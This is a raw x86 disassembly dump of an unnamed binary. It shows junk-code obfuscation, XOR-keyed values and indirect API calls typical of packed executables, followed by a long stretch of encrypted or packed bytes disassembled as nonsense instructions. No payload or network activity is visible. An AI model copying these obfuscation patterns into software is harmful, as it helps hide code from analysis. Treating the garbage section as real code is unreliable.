  41d2dc:	add    DWORD PTR ds:0x42834d,0x1b5f
  41d2e6:	mov    esi,DWORD PTR ds:0x428519
  41d2ec:	mov    edx,DWORD PTR ds:0x4285b1
  41d2f2:	sub    edx,esi
  41d2f4:	sub    esi,DWORD PTR [esi+edx*1]
  41d2f7:	mov    DWORD PTR [ebp-0x90],ecx
  41d2fd:	mov    DWORD PTR [ebp-0xe0],0x7a31
  41d307:	mov    DWORD PTR ds:0x42843d,0x52c8
  41d311:	mov    DWORD PTR [ebp-0x44],0x2514
  41d318:	mov    DWORD PTR [ebp-0xdc],0x699c
  41d322:	cmp    DWORD PTR ds:0x4284d9,0x0
  41d329:	mov    DWORD PTR ds:0x428501,0x628e
  41d333:	movzx  ecx,BYTE PTR ds:0x428351
  41d33a:	mov    ecx,DWORD PTR ds:0x428431
  41d340:	jmp    0x41d3bd
  41d345:	mov    DWORD PTR ds:0x42840d,0x21ce
  41d34f:	mov    DWORD PTR ds:0x428369,edi
  41d355:	cmp    DWORD PTR ds:0x4284d9,0x0
  41d35c:	jge    0x41d39a
  41d362:	push   DWORD PTR [ebp-0x20]
  41d365:	push   DWORD PTR [ebp-0xc]
  41d368:	push   DWORD PTR [ebp-0x18]
  41d36b:	call   DWORD PTR ds:0x42e138
  41d371:	mov    ecx,DWORD PTR ds:0x428395
  41d377:	mov    edx,DWORD PTR ds:0x4285b9
  41d37d:	sub    ecx,edx
  41d37f:	sub    ecx,DWORD PTR [ecx+edx*1]
  41d382:	sub    ecx,0x1d69
  41d388:	mov    ecx,DWORD PTR ds:0x4284b5
  41d38e:	mov    edx,DWORD PTR ds:0x4285ad
  41d394:	sub    ecx,edx
  41d396:	imul   ecx,DWORD PTR [ecx+edx*1]
  41d39a:	sbb    DWORD PTR ds:0x4284f1,0x4f1
  41d3a4:	sub    esi,DWORD PTR ds:0x42857d
  41d3aa:	xor    esi,esi
  41d3ac:	add    esi,DWORD PTR ds:0x4283d9
  41d3b2:	mov    edx,DWORD PTR ds:0x42848d
  41d3b8:	sub    edx,esi
  41d3ba:	add    esi,DWORD PTR [esi+edx*1]
  41d3bd:	mov    DWORD PTR [ebp-0xd8],0x1
  41d3c7:	mov    DWORD PTR [ebp-0x24],0x7901
  41d3ce:	mov    esi,DWORD PTR ds:0x4283a5
  41d3d4:	xor    ecx,ecx
  41d3d6:	or     ecx,DWORD PTR ds:0x4283b1
  41d3dc:	sub    esi,ecx
  41d3de:	sub    esi,DWORD PTR [esi+ecx*1]
  41d3e1:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  41d3eb:	mov    DWORD PTR [ebp-0x78],0x37f2
  41d3f2:	add    edx,eax
  41d3f4:	mov    DWORD PTR [ebp-0x10],0x62ba
  41d3fb:	mov    DWORD PTR [ebp-0x94],0x561c
  41d405:	mov    DWORD PTR [ebp-0x34],0x58bc
  41d40c:	mov    ecx,DWORD PTR ds:0x428409
  41d412:	xor    DWORD PTR ds:0x4284d5,ecx
  41d418:	mov    DWORD PTR [ebp-0x60],0x24c7
  41d41f:	mov    DWORD PTR [ebp-0x5c],0x7a45
  41d426:	adc    eax,eax
  41d428:	mov    eax,DWORD PTR [ebp-0x34]
  41d42b:	add    edx,esi
  41d42d:	mov    ecx,DWORD PTR [ebp-0x60]
  41d430:	adc    DWORD PTR ds:0x42857d,0x428339
  41d43a:	mov    edx,DWORD PTR [ebp-0x5c]
  41d43d:	neg    esi
  41d43f:	and    edx,0x160e
  41d445:	and    DWORD PTR ds:0x428569,0x7809
  41d44f:	sub    edx,ecx
  41d451:	sub    edx,0x29ad
  41d457:	cmp    DWORD PTR ds:0x428429,0x0
  41d45e:	mov    DWORD PTR ds:0x42854d,0x177e
  41d468:	mov    DWORD PTR ds:0x4284c9,0x4211
  41d472:	mov    esi,0x2b55
  41d477:	mov    ecx,DWORD PTR ds:0x4284d9
  41d47d:	jmp    0x41d4d7
  41d482:	mov    DWORD PTR ds:0x428371,edx
  41d488:	cmp    DWORD PTR ds:0x428429,0x0
  41d48f:	jbe    0x41d4cb
  41d495:	push   0x428571
  41d49a:	push   0x428165
  41d49f:	push   0x5caf
  41d4a4:	push   DWORD PTR [ebp-0x28]
  41d4a7:	push   0x7d55
  41d4ac:	call   DWORD PTR ds:0x42e080
  41d4b2:	or     DWORD PTR ds:0x428545,ebx
  41d4b8:	xor    ecx,ecx
  41d4ba:	add    ecx,DWORD PTR ds:0x428389
  41d4c0:	mov    esi,DWORD PTR ds:0x4283e5
  41d4c6:	sub    esi,ecx
  41d4c8:	and    ecx,DWORD PTR [ecx+esi*1]
  41d4cb:	or     DWORD PTR ds:0x428571,0x760f
  41d4d5:	xor    ecx,ecx
  41d4d7:	imul   edx,eax
  41d4da:	sbb    DWORD PTR ds:0x428575,edi
  41d4e0:	mov    eax,DWORD PTR [ebp-0x90]
  41d4e6:	lea    eax,[eax+edx*1+0x14f2e240]
  41d4ed:	add    edx,ecx
  41d4ef:	mov    DWORD PTR [ebp-0x174],eax
  41d4f5:	mov    eax,DWORD PTR [ebp-0x24]
  41d4f8:	mov    ecx,DWORD PTR [ebp-0x94]
  41d4fe:	mov    edx,DWORD PTR [ebp-0x10]
  41d501:	or     DWORD PTR ds:0x42836d,ecx
  41d507:	xor    edx,ecx
  41d509:	add    edx,DWORD PTR [ebp-0x78]
  41d50c:	not    ecx
  41d50e:	mov    ecx,DWORD PTR [ebp-0xc0]
  41d514:	lea    ecx,[edx+ecx*1+0x6ac1]
  41d51b:	and    ecx,eax
  41d51d:	add    esi,esi
  41d51f:	mov    eax,0x1101
  41d524:	or     esi,DWORD PTR ds:0x42857d
  41d52a:	sub    eax,ecx
  41d52c:	adc    DWORD PTR ds:0x428375,ebx
  41d532:	add    eax,DWORD PTR [ebp+0x8]
  41d535:	cmp    DWORD PTR ds:0x428561,0x0
  41d53c:	mov    DWORD PTR ds:0x428465,0x5bb
  41d546:	mov    edx,0x635
  41d54b:	mov    DWORD PTR ds:0x428465,0x7e26
  41d555:	jmp    0x41d5d0
  41d55a:	mov    DWORD PTR ds:0x428375,0x7d12
  41d564:	cmp    DWORD PTR ds:0x428561,0x0
  41d56b:	jae    0x41d5af
  41d571:	push   DWORD PTR [ebp-0x24]
  41d574:	push   0x16b6
  41d579:	push   DWORD PTR [ebp-0x10]
  41d57c:	push   0x5f53
  41d581:	push   DWORD PTR [ebp-0x1c]
  41d584:	push   DWORD PTR [ebp-0x18]
  41d587:	push   DWORD PTR [ebp-0x28]
  41d58a:	push   0x42827f
  41d58f:	call   DWORD PTR ds:0x42e2a4
  41d595:	adc    DWORD PTR ds:0x428339,0x7656
  41d59f:	sbb    DWORD PTR ds:0x428501,edx
  41d5a5:	xor    DWORD PTR ds:0x428349,0x32fd
  41d5af:	mov    edx,DWORD PTR ds:0x428439
  41d5b5:	add    edx,DWORD PTR ds:0x4284dd
  41d5bb:	mov    DWORD PTR ds:0x428439,edx
  41d5c1:	sub    esi,esi
  41d5c3:	movzx  edx,BYTE PTR ds:0x428339
  41d5ca:	add    DWORD PTR ds:0x4284f5,edx
  41d5d0:	mov    DWORD PTR [ebp-0x170],eax
  41d5d6:	mov    DWORD PTR [ebp-0x15c],0xcb79b576
  41d5e0:	mov    DWORD PTR [ebp-0x158],0x9c2b8ae8
  41d5ea:	mov    DWORD PTR [ebp-0x154],0xcb79b572
  41d5f4:	mov    DWORD PTR [ebp-0x150],0x9c2b8ae8
  41d5fe:	mov    esi,DWORD PTR [ebp-0x174]
  41d604:	mov    eax,DWORD PTR [ebp-0x154]
  41d60a:	mov    edx,DWORD PTR [ebp-0x150]
  41d610:	xor    eax,0xcb79b576
  41d615:	xor    edx,0x9c2b8ae8
  41d61b:	mov    cl,0x2
  41d61d:	call   0x408bb8
  41d622:	mov    edi,eax
  41d624:	mov    ebx,edx
  41d626:	mov    eax,DWORD PTR [ebp-0x154]
  41d62c:	jmp    0x41da13
  41d631:	out    dx,al
  41d632:	sbb    DWORD PTR [edi],eax
  41d634:	mov    dh,0x2c
  41d636:	mov    esp,0xfc579970
  41d63b:	bound  ebx,QWORD PTR [esi-0x6f2ea861]
  41d641:	ja     0x41d694
  41d643:	sar    BYTE PTR [esi-0x41413bb6],0x8f
  41d64a:	adc    bl,BYTE PTR [ebx]
  41d64c:	les    edx,FWORD PTR [edx+0x74]
  41d64f:	dec    edx
  41d650:	dec    esi
  41d651:	xor    edi,DWORD PTR [esi+0x35]
  41d654:	dec    ebp
  41d655:	les    esi,FWORD PTR [edx]
  41d657:	lock and DWORD PTR [edx],eax
  41d65a:	pusha  
  41d65b:	dec    esi
  41d65c:	add    eax,0x860f3527
  41d661:	sahf   
  41d662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d663:	inc    edx
  41d664:	push   edx
  41d665:	popf   
  41d666:	xchg   edx,eax
  41d667:	addr16 js 0x41d5fb
  41d66a:	push   edx
  41d66b:	jnp    0x41d61b
  41d66d:	mov    edx,0x1911b585
  41d672:	sbb    DWORD PTR [eax],edx
  41d674:	loopne 0x41d5fe
  41d676:	xlat   BYTE PTR es:[ebx]
  41d678:	nop    DWORD PTR [esi+0x18ef05b9]
  41d67f:	mov    ebx,0xe1974768
  41d684:	(bad)  
  41d685:	fwait
  41d686:	xor    cl,0xcb
  41d689:	inc    edx
  41d68a:	jae    0x41d67c
  41d68c:	pop    edx
  41d68d:	xor    esi,DWORD PTR [eax+0x4a]
  41d690:	in     al,dx
  41d691:	je     0x41d66a
  41d693:	hlt    
  41d694:	push   edx
  41d695:	inc    edx
  41d696:	cmp    al,0xd4
  41d698:	push   0x3
  41d69a:	xor    esi,esi
  41d69c:	popa   
  41d69d:	inc    ecx
  41d69e:	jno    0x41d716
  41d6a0:	mov    esp,0x5d53b26
  41d6a5:	mov    esi,0x65f0368d
  41d6aa:	gs out dx,al
  41d6ac:	sbb    DWORD PTR [ecx+0x26],0x5d
  41d6b0:	push   ebp
  41d6b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6b2:	mov    DWORD PTR [esi-0x319d91aa],eax
  41d6b8:	lea    edi,[eax-0x6d]
  41d6bb:	add    al,0x63
  41d6bd:	cmp    BYTE PTR [eax+0x16],cl
  41d6c0:	inc    ebx
  41d6c1:	ja     0x41d6a9
  41d6c3:	sbb    edx,0x3922ae22
  41d6c9:	pop    ds
  41d6ca:	xor    al,0x50
  41d6cc:	loope  0x41d6b2
  41d6ce:	mov    DWORD PTR [eax-0x5c],esp
  41d6d1:	test   eax,0xf6d35288
  41d6d6:	sbb    DWORD PTR [ebx+0x7a],0x9
  41d6da:	cmp    DWORD PTR [edi-0x3d73a0bd],0x7a
  41d6e1:	sbb    eax,0xf4a74e49
  41d6e6:	sbb    al,BYTE PTR [eax]
  41d6e8:	jno    0x41d73a
  41d6ea:	ss and al,0xc9
  41d6ed:	test   BYTE PTR [ecx+eiz*8+0x7e27f758],0x87
  41d6f5:	repnz xor eax,0xfedc59b3
  41d6fb:	add    BYTE PTR [edx],cl
  41d6fd:	imul   ebp,DWORD PTR [bx+di+0x6bcd],0xd66b5c4e
  41d706:	cmp    al,bl
  41d708:	sub    bh,BYTE PTR [eax]
  41d70a:	mov    ecx,0xe0d3ee7a
  41d70f:	add    eax,0xd4006bf3
  41d714:	sbb    ebp,DWORD PTR [edi]
  41d716:	push   ebx
  41d717:	sub    eax,0x67a1f5d7
  41d71c:	mov    ebx,0x729e9e2f
  41d721:	icebp  
  41d722:	xchg   edx,eax
  41d723:	outs   dx,DWORD PTR ds:[esi]
  41d724:	repnz imul eax,DWORD PTR [ebp+0x2a],0xd65f0996
  41d72c:	rcl    al,cl
  41d72e:	xor    BYTE PTR [ebx-0x65ebdefa],al
  41d734:	adc    edi,edx
  41d736:	outs   dx,BYTE PTR fs:[esi]
  41d738:	sub    al,dl
  41d73a:	ins    BYTE PTR es:[edi],dx
  41d73b:	fisttp WORD PTR [eax-0x35]
  41d73e:	inc    esi
  41d73f:	mov    al,0x34
  41d741:	aad    0xc0
  41d743:	icebp  
  41d744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d745:	and    BYTE PTR [ebx],bh
  41d747:	sub    ebx,DWORD PTR [edx]
  41d749:	mov    dh,0xc
  41d74b:	dec    ecx
  41d74c:	shl    BYTE PTR [ebx-0x121ce0a0],0x5
  41d753:	push   ebp
  41d754:	push   ss
  41d755:	jbe    0x41d70c
  41d757:	mov    al,ds:0x4bd66020
  41d75c:	mov    dl,0x48
  41d75e:	jne    0x41d71c
  41d760:	dec    edi
  41d761:	loope  0x41d795
  41d763:	int3   
  41d764:	mov    cl,0x8a
  41d766:	jno    0x41d715
  41d768:	dec    ebx
  41d769:	push   ebx
  41d76a:	je     0x41d7ea
  41d76c:	imul   edx,DWORD PTR [edi],0x2b
  41d76f:	fldenv [edi-0x7a]
  41d772:	sahf   
  41d773:	adc    dl,BYTE PTR [edx+eiz*1]
  41d776:	mov    BYTE PTR ds:0xb6dd15af,bl
  41d77c:	xor    ch,BYTE PTR [eax+0x49a2dd7f]
  41d782:	mov    al,0x7d
  41d784:	stos   DWORD PTR es:[edi],eax
  41d785:	push   ebx
  41d786:	mov    bh,0x75
  41d788:	jp     0x41d787
  41d78a:	stos   DWORD PTR es:[edi],eax
  41d78b:	or     ah,0x42
  41d78e:	and    al,ch
  41d790:	xchg   DWORD PTR [ebp-0x19],esi
  41d793:	inc    edi
  41d794:	add    BYTE PTR [eax+eax*8+0x371bfd99],cl
  41d79b:	fistp  WORD PTR [edi]
  41d79d:	jecxz  0x41d7ae
  41d79f:	out    0x27,eax
  41d7a1:	arpl   sp,dx
  41d7a3:	and    BYTE PTR [eax-0x1f],bh
  41d7a6:	and    ecx,DWORD PTR [ebx]
  41d7a8:	imul   ebx,edi,0x73c8cc99
  41d7ae:	or     BYTE PTR [edx+0x3d],dl
  41d7b1:	cld    
  41d7b2:	sub    al,dh
  41d7b4:	cmp    eax,ebx
  41d7b6:	jne    0x41d7b7
  41d7b8:	(bad)  
  41d7b9:	mul    DWORD PTR [ebp-0x4b]
  41d7bc:	into   
  41d7bd:	xchg   esi,eax
  41d7be:	ss inc ecx
  41d7c0:	mov    al,ds:0x58a5374
  41d7c5:	in     eax,dx
  41d7c6:	inc    esi
  41d7c7:	jns    0x41d817
  41d7c9:	mov    edx,0x99690ba8
  41d7ce:	push   0x0
  41d7d0:	lea    esp,[eax-0x4f]
  41d7d3:	xor    al,0x7d
  41d7d5:	pop    edx
  41d7d6:	xlat   BYTE PTR ds:[ebx]
  41d7d7:	push   0xffffffc7
  41d7d9:	and    al,0x87
  41d7db:	and    al,0x55
  41d7dd:	fisub  DWORD PTR [esi]
  41d7df:	xor    DWORD PTR [ecx],ebp
  41d7e1:	and    ah,BYTE PTR [edi-0x51049609]
  41d7e7:	jae    0x41d7fe
  41d7e9:	icebp  
  41d7ea:	mov    ebp,0x841a073
  41d7ef:	dec    BYTE PTR [ecx-0x6c392374]
  41d7f5:	or     BYTE PTR [edx-0x1a],dl
  41d7f8:	jl     0x41d782
  41d7fa:	hlt    
  41d7fb:	clc    
  41d7fc:	push   esp
  41d7fd:	dec    edi
  41d7fe:	jb     0x41d82a
  41d800:	in     eax,dx
  41d801:	push   ecx
  41d802:	sub    edi,esi
  41d804:	rcl    DWORD PTR [eax],0x60
  41d807:	daa    
  41d808:	cld    
  41d809:	into   
  41d80a:	sub    ecx,DWORD PTR [esi]
  41d80c:	push   edx
  41d80d:	mov    al,0x98
  41d80f:	cmp    DWORD PTR [ebx+0x32938d7],ecx
  41d815:	jmp    0x6a19:0xc646ce53
  41d81c:	fisttp QWORD PTR [ebx-0x40be005]
  41d822:	nop
  41d823:	retf   0x33ca
  41d826:	mov    dl,BYTE PTR [edx-0x3a5ac0e1]
  41d82c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d82d:	mov    dl,0x23
  41d82f:	enter  0x9983,0xba
  41d833:	mov    eax,ds:0x1060be20
  41d838:	push   0xffffff80
  41d83a:	or     cl,al
  41d83c:	xor    BYTE PTR ds:0xc23ba3ea,dh
  41d842:	mov    BYTE PTR [ebx],cl
  41d844:	stos   DWORD PTR es:[edi],eax
  41d845:	pop    ds
  41d846:	jge    0x41d806
  41d848:	mov    ds:0x9448a115,eax
  41d84d:	pop    edi
  41d84e:	lds    esp,FWORD PTR [ebx-0x60]
  41d851:	pop    ss
  41d852:	cmp    ah,BYTE PTR [edi]
  41d854:	mov    eax,ds:0x42910f61
  41d859:	loop   0x41d8b4
  41d85b:	xchg   ebx,eax
  41d85c:	push   ebp
  41d85d:	shl    dh,0x9a
  41d860:	shl    DWORD PTR [ecx],cl
  41d862:	inc    ecx
  41d863:	fsub   QWORD PTR [esi+esi*4]
  41d866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d867:	adc    ebx,edx
  41d869:	mov    bl,0x41
  41d86b:	mov    dh,0x90
  41d86d:	(bad)  
  41d86f:	jnp    0x41d807
  41d871:	dec    edi
  41d872:	fld    st(3)
  41d874:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d875:	ror    DWORD PTR [ecx],0x17
  41d878:	mov    ds:0xa3e79ed0,al
  41d87d:	clc    
  41d87e:	stc    
  41d87f:	adc    BYTE PTR [ecx+ebx*1+0x21227e6],dh
  41d886:	mov    bl,0x1c
  41d888:	adc    ecx,ebp
  41d88a:	sbb    esi,DWORD PTR [edi]
  41d88c:	jp     0x41d8e0
  41d88e:	shl    BYTE PTR [edx+0x56],0xde
  41d892:	sahf   
  41d893:	addr16 mov ds:0xfb72,al
  41d897:	fiadd  WORD PTR [ebx+0x310fefbb]
  41d89d:	dec    ebx
  41d89e:	add    edi,DWORD PTR [edx]
  41d8a0:	sbb    ecx,DWORD PTR [eax+eiz*4]
  41d8a3:	adc    al,0x3f
  41d8a5:	jmp    0x37eaf817
  41d8aa:	push   eax
  41d8ab:	dec    DWORD PTR [edi-0x1ec2c41a]
  41d8b1:	jecxz  0x41d86b
  41d8b3:	call   0x9a51df09
  41d8b8:	aad    0x0
  41d8ba:	fld    DWORD PTR [edi-0x27]
  41d8bd:	test   al,0xb
  41d8bf:	retf   0x4374
  41d8c2:	fcmovu st,st(3)
  41d8c4:	inc    ebp
  41d8c5:	inc    ebp
  41d8c6:	int    0xf2
  41d8c8:	cmc    
  41d8c9:	xchg   ebp,eax
  41d8ca:	push   0x79
  41d8cc:	xor    al,0x77
  41d8ce:	in     eax,dx
  41d8cf:	outs   dx,BYTE PTR ds:[esi]
  41d8d0:	rcr    DWORD PTR [edi+ebp*1],0x1b
  41d8d4:	inc    edi
  41d8d5:	push   ebx
  41d8d6:	call   0x625f:0xa6084427
  41d8dd:	jecxz  0x41d95a
  41d8df:	ins    BYTE PTR es:[edi],dx
  41d8e0:	hlt    
  41d8e1:	and    ebx,DWORD PTR [ebx+eax*4-0x4a36f038]
  41d8e8:	into   
  41d8e9:	push   cs
  41d8ea:	and    DWORD PTR es:[ebx-0x6f],ebp
  41d8ee:	iret   
  41d8ef:	mov    ds:0x649baecf,eax
  41d8f4:	pop    ebx
  41d8f5:	popa   
  41d8f6:	dec    edx
  41d8f7:	adc    esp,DWORD PTR [esi+0x6d9d0e82]
  41d8fd:	jnp    0x41d95e
  41d8ff:	jg     0x41d92d
  41d901:	push   edi
  41d902:	add    ebp,ecx
  41d904:	push   ebp
  41d905:	(bad)  
  41d907:	fwait
  41d908:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d90a:	pop    eax
  41d90b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d90c:	cwde   
  41d90d:	push   edi
  41d90e:	inc    ecx
  41d90f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d910:	cmp    al,0x56
  41d912:	push   esp
  41d913:	push   cs
  41d914:	out    dx,al
  41d915:	in     eax,0x97
  41d917:	neg    BYTE PTR [ecx-0x41]
  41d91a:	inc    ebp
  41d91b:	dec    ecx
  41d91c:	ins    DWORD PTR es:[edi],dx
  41d91d:	push   0xd24860fd
  41d922:	(bad)  
  41d923:	sbb    ecx,DWORD PTR [ebp-0x7e2eda2]
  41d929:	mov    ebp,0xd71f1d60
  41d92e:	adc    cl,BYTE PTR [eax-0x66]
  41d931:	jb     0x41d907
  41d933:	lea    ebx,[edx+0x44]
  41d936:	xchg   edx,eax
  41d937:	outs   dx,DWORD PTR ds:[esi]
  41d938:	mov    ch,BYTE PTR [esi+ebx*2]
  41d93b:	ficomp WORD PTR [ecx]
  41d93d:	test   al,0x71
  41d93f:	scas   eax,DWORD PTR es:[edi]
  41d940:	xchg   ebx,eax
  41d941:	jae    0x41d96e
  41d943:	ja     0x41d968
  41d945:	sbb    al,0x6b
  41d947:	jmp    0x8336:0x40985dfc
  41d94e:	push   ebp
  41d94f:	mov    eax,ds:0x3adba8d9
  41d954:	ds dec esp
  41d956:	xor    BYTE PTR [ebx+edi*8+0x69],0x3f
  41d95b:	adc    BYTE PTR [eiz*8+0xb0d6dca],al
  41d962:	and    bl,ah
  41d964:	adc    BYTE PTR [ecx-0xabf71f],dl
  41d96a:	and    DWORD PTR [edx+0x3d],edx
  41d96d:	inc    eax
  41d96e:	mov    eax,0xcd49518b
  41d973:	stos   DWORD PTR es:[edi],eax
  41d974:	fidivr WORD PTR [edx+0x0]
  41d977:	leave  
  41d978:	ror    DWORD PTR [ebx],cl
  41d97a:	xor    eax,0xe662b560
  41d97f:	int3   
  41d980:	lahf   
  41d981:	pop    ebp
  41d982:	mov    fs,WORD PTR [edx+0x6a792a83]
  41d988:	arpl   WORD PTR [eax],dx
  41d98a:	cs je  0x41d926
  41d98d:	std    
  41d98e:	into   
  41d98f:	ficomp WORD PTR [ecx+0x6968c380]
  41d995:	jge    0x41d963
  41d997:	pushf  
  41d998:	cmp    DWORD PTR [eax],ebp
  41d99a:	or     eax,0xaf985221
  41d99f:	int    0x81
  41d9a1:	nop
  41d9a2:	rol    BYTE PTR [eax+0x1c],1
  41d9a5:	scas   al,BYTE PTR es:[edi]
  41d9a6:	adc    DWORD PTR [eax-0x84275ca],ebp
  41d9ac:	rcr    DWORD PTR [edi],0x3a
  41d9af:	sub    eax,DWORD PTR [ecx+edi*2]
  41d9b2:	cdq    
  41d9b3:	test   al,0xa4
  41d9b5:	and    DWORD PTR [edx+0x63],ecx
  41d9b8:	fbld   TBYTE PTR [esi+0x4c]
  41d9bb:	push   eax
  41d9bc:	xchg   esi,eax
  41d9bd:	fs dec ebx
  41d9bf:	xchg   edi,eax
  41d9c0:	fwait
  41d9c1:	add    eax,0xc5a68a45
  41d9c6:	fsub   QWORD PTR ds:0x372ca682
  41d9cc:	pusha  
  41d9cd:	nop
  41d9ce:	loopne 0x41da1f
  41d9d0:	dec    ecx
  41d9d1:	pop    edi
  41d9d2:	cld    
  41d9d3:	lds    ecx,FWORD PTR [ebx+ebx*4-0x9]
  41d9d7:	into   
  41d9d8:	mov    al,0xa1
  41d9da:	pop    edi
  41d9db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9dc:	dec    edx
  41d9dd:	pop    es
  41d9de:	sar    DWORD PTR [edi],1
  41d9e0:	mov    ss,WORD PTR [ebx]
  41d9e2:	into   
  41d9e3:	pop    esi
  41d9e4:	loope  0x41da11
  41d9e6:	add    BYTE PTR [edx],ah
  41d9e8:	pop    eax
  41d9e9:	xor    bl,BYTE PTR [edx]
  41d9eb:	into   
  41d9ec:	xchg   esi,eax
  41d9ed:	sub    BYTE PTR [edx+0x6d],0xf9
  41d9f1:	test   al,0x1
  41d9f3:	ins    DWORD PTR es:[edi],dx
  41d9f4:	push   ebx
  41d9f5:	and    cl,dh
  41d9f7:	cmc    
  41d9f8:	dec    esp
  41d9f9:	xchg   ebp,eax
  41d9fa:	xchg   edx,eax
  41d9fb:	fistp  WORD PTR [edx]
  41d9fd:	aad    0x50
  41d9ff:	out    0xbd,eax
  41da01:	push   eax
  41da02:	ins    BYTE PTR es:[edi],dx
  41da03:	scas   al,BYTE PTR es:[edi]
  41da04:	and    eax,0xbfc4b2a6
  41da09:	in     eax,dx
  41da0a:	loope  0x41da2d
  41da0c:	and    al,0x2f
  41da0e:	js     0x41da01
  41da10:	mov    ds:0x958b6bfb,al
  41da15:	mov    al,0xfe
  41da17:	(bad)  
  41da18:	push   DWORD PTR ds:0xcb79b576
  41da1e:	xor    edx,0x9c2b8ae8
  41da24:	mov    cl,0x3e
  41da26:	call   0x4223fa
  41da2b:	or     edi,eax
  41da2d:	or     ebx,edx
  41da2f:	mov    eax,DWORD PTR [ebp-0x15c]
  41da35:	mov    edx,DWORD PTR [ebp-0x158]
  41da3b:	jmp    0x41de22
  41da40:	outs   dx,BYTE PTR ds:[esi]
  41da41:	cdq    
  41da42:	bound  ebp,QWORD PTR fs:[esp+edi*4+0x63179970]
  41da4a:	xor    bl,ch
  41da4c:	ret    0xbf19
  41da4f:	iret   
  41da50:	add    ebx,DWORD PTR [ecx-0x40]
  41da53:	mov    esi,0xbebec44a
  41da58:	push   es
  41da59:	or     eax,edx
  41da5b:	ret    
  41da5c:	vmovhps xmm0,xmm6,QWORD PTR [edi]
  41da60:	inc    ecx
  41da61:	jmp    0x41da16
  41da63:	aas    
  41da64:	jb     0x41daba
  41da66:	inc    ecx
  41da67:	(bad)  
  41da68:	rcl    DWORD PTR [esi+0x4c184a08],1
  41da6e:	int    0x4f
  41da70:	mov    bl,0x32
  41da72:	mov    ebp,0x324878e3
  41da77:	push   ss
  41da78:	sub    ebx,DWORD PTR [eax+0x3e793e65]
  41da7e:	dec    ecx
  41da7f:	push   ecx
  41da80:	loop   0x41db00
  41da82:	sbb    eax,DWORD PTR [edi]
  41da84:	stos   BYTE PTR es:[edi],al
  41da85:	dec    ebx
  41da86:	push   edx
  41da87:	shl    BYTE PTR [ebx+edi*8+0x6de97a8f],0x4
  41da8f:	call   0x14f:0xd88a7969
  41da96:	mov    ds,esp
  41da98:	jp     0x41db14
  41da9a:	and    bh,dl
  41da9c:	scas   eax,DWORD PTR es:[edi]
  41da9d:	lock imul eax,DWORD PTR [esi],0x1eb55b5b
  41daa4:	mov    WORD PTR [edi-0x43],?
  41daa7:	xor    dh,BYTE PTR [ebx+0x6d]
  41daaa:	cli    
  41daab:	xor    al,0xcd
  41daad:	push   eax
  41daae:	jae    0x41da7e
  41dab0:	ret    
  41dab1:	xchg   ecx,eax
  41dab2:	jnp    0x41daf0
  41dab4:	mov    ah,0x8a
  41dab6:	call   0x5361:0xa1711d3e
  41dabd:	xor    dh,BYTE PTR [edi-0xb794ccb]
  41dac3:	out    0x81,eax
  41dac5:	in     al,0x8f
  41dac7:	(bad)  
  41dac8:	aam    0xd2
  41daca:	lds    esp,FWORD PTR [ecx+esi*1-0x5a]
  41dace:	rcl    ah,cl
  41dad0:	add    esp,DWORD PTR [esi-0x1d]
  41dad3:	push   ebp
  41dad4:	aas    
  41dad5:	add    bh,BYTE PTR [edi]
  41dad7:	add    ebp,DWORD PTR [ecx+0x24]
  41dada:	or     al,0x30
  41dadc:	test   eax,0xd5f0e0d2
  41dae1:	push   es
  41dae2:	(bad)  
  41dae3:	push   edi
  41dae4:	mov    es,WORD PTR [eax-0x6c]
  41dae7:	imul   ecx,DWORD PTR [edi-0x293ae794],0x7de638fe
  41daf1:	and    dh,BYTE PTR [eax]
  41daf3:	inc    ebp
  41daf4:	in     al,dx
  41daf5:	fild   DWORD PTR [ebp-0x13]
  41daf8:	scas   al,BYTE PTR es:[edi]
  41daf9:	scas   al,BYTE PTR es:[edi]
  41dafa:	jle    0x41db35
  41dafc:	jnp    0x41da9a
  41dafe:	(bad)  
  41daff:	inc    edx
  41db00:	aam    0x7b
  41db02:	inc    edi
  41db03:	(bad)  
  41db05:	mov    BYTE PTR [esi-0x51b2470],cl
  41db0b:	adc    al,0xd9
  41db0d:	fld    st(2)
  41db0f:	adc    ecx,ebx
  41db11:	xchg   BYTE PTR [eax],dl
  41db13:	sbb    DWORD PTR [eax+eax*2],0x615b5e06
  41db1a:	sub    eax,DWORD PTR [ebx+ebp*4]
  41db1d:	out    dx,al
  41db1e:	lahf   
  41db1f:	mov    bl,0x51
  41db21:	mov    dl,0x7c
  41db23:	inc    esp
  41db24:	enter  0xed56,0xaf
  41db28:	cmp    eax,0x84542820
  41db2d:	dec    eax
  41db2e:	icebp  
  41db2f:	test   eax,0x226d038a
  41db34:	sub    BYTE PTR [ecx+eax*4-0x1ece26e0],bh
  41db3b:	bound  esi,QWORD PTR [ebx]
  41db3d:	fstp   QWORD PTR [eax+ebp*2+0x71]
  41db41:	push   es
  41db42:	mov    dh,0xf5
  41db44:	je     0x41db8a
  41db46:	xor    al,BYTE PTR [eax]
  41db48:	jmp    0x52108bbd
  41db4d:	ficom  DWORD PTR [eax-0x55ddaa83]
  41db53:	mov    cl,0x99
  41db55:	out    dx,eax
  41db56:	lea    edi,[eax]
  41db58:	shr    edi,cl
  41db5a:	push   ecx
  41db5b:	xor    eax,0x24af1fcf
  41db60:	aas    
  41db61:	jo     0x41db31
  41db63:	fnsave [ebx-0x765697b3]
  41db69:	mov    al,0x4c
  41db6b:	nop
  41db6c:	es fs sbb eax,0x4d741302
  41db73:	pop    eax
  41db74:	aas    
  41db75:	retf   
  41db76:	cs sbb eax,0x42d1e1c9
  41db7c:	sub    eax,0xda89ffcc
  41db81:	lock add al,0x26
  41db84:	call   0x35bb7a50
  41db89:	repnz test DWORD PTR [eiz*2-0x630c2c9],0x4f5dd728
  41db95:	xchg   edx,eax
  41db96:	lds    ebx,FWORD PTR [esi-0x7a]
  41db99:	les    ebp,FWORD PTR [edx]
  41db9b:	jmp    0x49549ca3
  41dba0:	clc    
  41dba1:	div    DWORD PTR [ecx+0x4e]
